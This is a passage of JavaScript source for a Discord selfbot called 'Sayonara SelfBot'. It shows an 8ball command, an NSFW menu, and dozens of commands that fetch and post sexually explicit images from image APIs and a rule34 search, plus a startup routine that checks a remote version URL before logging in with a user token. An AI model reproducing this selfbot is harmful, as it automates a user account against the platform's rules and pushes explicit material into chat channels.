            const funwhitelist = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙁𝙪𝙣 𝙒𝙝𝙞𝙩𝙚𝙡𝙞𝙨𝙩」" + random_emojis + " <<」**")
                .setColor(color)
                .setDescription('```           ' + random_emojis + ' Sayonara Whitelisted ' + random_emojis + '```')
                .addField("**``" + prefix + "8ball + TEXT ``**", `***${language.EIGHTBALL_DESC}***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(funwhitelist)
            consolelog("information", `Whitelised User, ${language.DEBUG_LOG_FUN_SEND}`)
        }

        if (cmd === "8ball") 
        {
            let question = args.slice(0).join(" ");
            var random_reply = ['Yes!', 'No.', 'Maybe?', 'Probably', 'I dont think', 'Never!', 'You can try..'][Math.floor(Math.random() * 7)]
            message.channel.send("**user whitelisted have ask the question: " + question + "**")

            let thereply = new Discord.RichEmbed()
            .setColor(color)
            .setTitle('8ball have say:')
            .setDescription(random_reply);

            message.channel.send(thereply)
        }

        //#endregion


        //#region > NSFW OPTIONS WHITELIST

        if (cmd === "nsfw") 
        {
            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙉𝙎𝙁𝙒 𝙒𝙝𝙞𝙩𝙚𝙡𝙞𝙨𝙩」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "hentai ```**", `***${language.HENTAI_DESC}.***`)
                .addField("**```" + prefix + "4k ```**", `***${language.FOURK_DESC}.***`)
                .addField("**```" + prefix + "hass ```**", `***${language.HASS_DESC}.***`)
                .addField("**```" + prefix + "hmidriff ```**", `***${language.HMIDRIFF_DESC}.***`)
                .addField("**```" + prefix + "pgif ```**", `**${language.PGIF_DESC}.***`)
                .addField("**```" + prefix + "holo ```**", `***${language.HOLO_DESC}.***`)
                .addField("**```" + prefix + "hneko ```**", `***${language.HNEKO_DESC}.***`)
                .addField("**```" + prefix + "neko ```**", `***${language.NEKO_DESC}.***`)
                .addField("**```" + prefix + "hkitsune ```**", `***${language.HKITSUNE_DESC}.***`)
                .addField("**```" + prefix + "kemonomimi ```**", `***${language.KEMONOMIMI_DESC}.***`)
                .addField("**```" + prefix + "anal ```**", `***${language.ANAL_DESC}.***`)
                .addField("**```" + prefix + "hanal ```**", `***${language.HANAL_DESC}.***`)
                .addField("**```" + prefix + "gonewild ```**", `***${language.GONEWILD_DESC}.***`)
                .addField("**```" + prefix + "kanna ```**", `***${language.KANNA_DESC}.***`)
                .addField("**```" + prefix + "ass ```**", `***${language.ASS_DESC}.***`)
                .addField("**```" + prefix + "pussy ```**", `***${language.PUSSY_DESC}.***`)
                .addField("**```" + prefix + "thigh ```**", `***${language.THIGH_DESC}.***`)
                .addField("**```" + prefix + "hthigh ```**", `***${language.HTHIGH_DESC}.***`)
                .addField("**```" + prefix + "paizuri ```**", `***${language.PAIZURI_DESC}.***`)
                .addField("**```" + prefix + "tentacle ```**", `***${language.TENTACLE_DESC}.***`)
                .addField("**```" + prefix + "boobs ```**", `***${language.BOOBS_DESC}.***`)
                .addField("**```" + prefix + "hboobs ```**", `***${language.HBOOBS_DESC}.***`)
                .addField("**```" + prefix + "yaoi ```**", `***${language.YAOI_DESC}.***`)
                .addField("**```" + prefix + "futanari ```**", `***${language.FUTANARI_DESC}.***`)
                .addField("**```" + prefix + "r34 + (ex: pussy, panties) ```**", `***${language.R34_DESC}.***`)

                const help1 = new Discord.RichEmbed()
                .setColor(color)
                .addField("**```" + prefix + "blowjob ```**", `***${language.BLOWJOB_DESC}.***`)
                .addField("**```" + prefix + "cumsluts ```**", `***${language.CUMSLUTS_DESC}.***`)
                .addField("**```" + prefix + "cumarts ```**", `***${language.CUMARTS_DESC}.***`)
                .addField("**```" + prefix + "feet ```**", `***${language.FEET_DESC}.***`)
                .addField("**```" + prefix + "feetgif ```**", `***${language.FEETGIF_DESC}.***`)
                .addField("**```" + prefix + "femdom ```**", `***${language.FEMDOM_DESC}.***`)
                .addField("**```" + prefix + "gasm ```**", `***${language.GASM_DESC}.***`)
                .addField("**```" + prefix + "kuni ```**", `***${language.KUNI_DESC}.***`)
                .addField("**```" + prefix + "lesbian ```**", `***${language.LESBIAN_DESC}.***`)
                .addField("**```" + prefix + "pussywank ```**", `***${language.PUSSYWANK_DESC}.***`)
                .addField("**```" + prefix + "tits ```**", `***${language.TITS_DESC}.***`)
                .addField("**```" + prefix + "trapnsfw ```**", `***${language.TRAPIMG_DESC}.***`)
                .addField("**```" + prefix + "yuri ```**", `***${language.YURI_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            message.channel.send(help1)
            consolelog("information", `Whitelised User, ${language.DEBUG_LOG_NSFW_SEND}`)
        }

        if (cmd === "hentai") 
        {
            message.delete()
            HentaiIMG();

            async function HentaiIMG() {
                let img = await Nekow.get("hentai");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hentaii !**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "4k") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("4k");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**4K Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hass") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hass");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hass Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hmidriff") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hmidriff");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**hmidriff Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "pgif") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("pgif");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**pgif Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "holo") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("holo");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Holo Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hneko") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hneko");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hentai Neko Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "neko") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("neko");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Neko Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hkitsune") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hkitsune");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hkitsune Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "kemonomimi") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("kemonomimi");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Kemonomimi Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "anal") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("anal");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Anal Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hanal")
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hanal");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hanal Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "gonewild") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("gonewild");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Gonewild Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "kanna") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("kanna");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Kanna Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "ass") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("ass");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Ass Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "pussy") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("pussy");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Pussy Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "thigh") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("thigh");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Thigh Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hthigh") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hthigh");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hthigh Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "paizuri") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("paizuri");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Paizuri Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "tentacle") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("tentacle");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Tentacle Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "boobs") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("boobs");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Boobs Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "hboobs") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("hboobs");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Hboobs Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "yaoi") 
        {
            message.delete()
            IMG();

            async function IMG() {
                let img = await Nekow.get("yaoi");

                let embed = new Discord.RichEmbed()
                    .setColor(color)
                    .setTitle('**Yaoi Image**')
                    .setImage(img)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                embed.setTimestamp();

                message.channel.send(embed);
            }
        }

        if (cmd === "futanari") 
        {
            message.delete()
            FutaIMG();

            async function FutaIMG() 
            {
                request('https://nekos.life/api/v2/img/futanari', function(error, response, html) {
                    if (!error && response.statusCode == 200) {
                        var $ = cheerio.load(html);
                        var TEXT = $.text()
                        var FIX1 = TEXT.replace('{"url":"', '')
                        var FIX2 = FIX1.replace('"}', '')

                        let embed = new Discord.RichEmbed()
                            .setColor(color)
                            .setTitle('**Futanari  !**')
                            .setImage(FIX2)
                            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                        embed.setTimestamp();

                        message.channel.send(embed)
                    }
                });
            }
        }

        if (cmd === "r34")
        {
            var query = message.content.split(/\s+/g).slice(1).join(" ");
            booru.search('rule34', [query], {nsfw: true, limit: 1, random: true })
                .then(booru.commonfy)
                .then(images => {
                    for (let image of images) 
                    {
                        const embed = new Discord.RichEmbed()
                        .setTitle("Rule34:")
                        .setImage(image.common.file_url)
                        .setColor(color)
                        .setFooter(`Tags: r34 ${query}`)
                        .setURL(image.common.file_url)
                        .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                    return message.channel.send({ embed });
                    }
          
                }).catch(err => 
                {
                    if (err.name === 'booruError') 
                    {
                        return message.channel.send(`No results found for **${query}**!`);
                    } else {
                        return message.channel.send(`No results found for **${query}**!`);
                    }
          })
        }

        if (cmd === "blowjob")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.blowJob());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "cumsluts")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.cumsluts());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "cumarts")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.cumArts());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "feet")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.feet());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "feetgif")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.feetGif());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "femdom")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.femdom());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "gasm")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.gasm());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "kuni")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.kuni());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "lesbian")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.lesbian());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "pussywank")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.pussyWankGif());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "tits")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.tits());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "trapnsfw")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.trap());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "yuri")
        {
            message.delete()

            async function work() 
            {
                let owo = (await neko.nsfw.yuri());
        
                const embed = new Discord.RichEmbed()
                .setDescription(`:underage:\n**[If you don't see the image, click here](${owo.url})**`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        //#endregion
    
    
    }

    //#endregion

    

});



//#region > BEFORE START SAYONARA


console.clear();

axios.get('http://downcraft.xyz/Sayonara/sayonara_selfbot_update.php').then(response =>
{
    if (response.data === "v6.0")
    {
        console.log(gradient.morning(`░░░░░░░░░░▄
░░░░░░░░▄▐░▄▄█████▄▄
░░░░░░▄█████████████▄▀▄▄░▄▄▄
░░░░░█████████████████▄██████
░░░░████▐█████▌████████▌█████▌
░░░████▌█████▌█░████████▐▀██▀
░▄█████░█████▌░█░▀██████▌█▄▄▀▄
░▌███▌█░▐███▌▌░░▄▄░▌█▌███▐███░▀
▐░▐██░░▄▄▐▀█░░░▐▄█▀▌█▐███▐█
░░███░▌▄█▌░░▀░░▀██░░▀██████▌
░░░▀█▌▀██▀░▄░░░░░░░░░███▐███
░░░░██▌░░░░░░░░░░░░░▐███████▌
░░░░███░░░░░▀█▀░░░░░▐██▐███▀▌
░░░░▌█▌█▄░░░░░░░░░▄▄████▀░▀
░░░░░░█▀██▄▄▄░▄▄▀▀▒█▀█░▀
░░░░░░░░░▀░▀█▀▌▒▒▒░▐▄▄
░░░░░░░░▄▄▀▀▄░░░░░░▄▀░▀▀▄▄
░░░░░░▄▀░▄▀▄░▌░░░▄▀░░░░░░▄▀▀▄
░░░░░▐▒▄▀▄▀░▌▀▄▄▀░░░░░░▄▀▒▒▒▐
░░░░▐▒▒▌▀▄░░░░░▌░░░░▄▄▀▒▐▒▒▒▒▌
░░░▐▒▒▐░▌░▀▄░░▄▀▀▄▀▀▒▌▒▐▒▒▒▒▐▐
░░░▌▄▀░░░▄▀░█▀▒▒▒▒▀▄▒▌▐▒▒▒▒▒▌▌
░░▄▀▒▐░▄▀░░░▌▒▐▒▐▒▒▒▌▀▒▒▒▒▒▐▒▌`))
        console.log("")
        
        console.log(gradient.morning(`Welcome to Sayonara SelfBot V${SayoVersion} Made By Misakiii`))
        console.log(gradient.vice("Please wait Sayonara, is starting..."))
        sleep(5000);
        
        keepAlive();
        client.login(token).catch(() => 
        {
            return console.log("\x1b[31m " + language.ERROR_TOKEN_INVALID)
        });
    }
    else
    {
        console.log("\x1b[31m " + language.ERROR_NEW_UPDATE)
        sleep(8000);
    }
})

//#endregion



